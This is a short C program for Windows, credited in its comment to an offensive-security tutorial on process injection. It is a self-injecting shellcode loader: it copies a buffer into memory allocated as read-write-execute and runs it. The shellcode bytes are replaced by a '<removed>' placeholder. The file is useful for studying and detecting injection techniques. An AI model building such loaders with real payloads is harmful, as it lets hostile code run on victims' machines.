// Inspired from: https://www.ired.team/offensive-security/code-injection-process-injection/process-injection


#include "stdio.h"
#include "Windows.h"
#include "../functions.h"

int main(int argc, char* argv[])
{
	/* length: 927 bytes */
	unsigned char buf[] = "<removed>";

	// Self-inject
	void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof buf);
	((void(*)())exec)();

	return 0;
}
